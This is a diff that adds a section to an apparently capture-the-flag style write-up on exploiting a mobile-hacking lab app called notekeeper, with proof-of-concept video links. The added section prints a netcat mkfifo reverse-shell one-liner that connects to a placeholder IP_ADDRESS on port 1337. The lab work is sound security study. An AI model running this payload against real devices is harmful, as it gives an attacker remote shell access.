@@ -110,4 +110,13 @@ Here is the poc video with another command:
 
 [![](https://img.youtube.com/vi/8RmEMxs_Lpk/0.jpg)](https://youtu.be/8RmEMxs_Lpk)
 
+Also we can get reverse shell :).
+Payload:
+```sh
+rm /data/data/com.mobilehackinglab.notekeeper/f;mkfifo /data/data/com.mobilehackinglab.notekeeper/f;cat /data/data/com.mobilehackinglab.notekeeper/f|sh -i 2>&1|nc IP_ADDRESS 1337 >/data/data/com.mobilehackinglab.notekeeper/f
+```
+Here is poc video:
+
+[![](https://img.youtube.com/vi/V59MJxXag_0/0.jpg)](https://youtu.be/V59MJxXag_0)
+
 Thanks for reading! See you in next writeups 👋🏻👋🏻
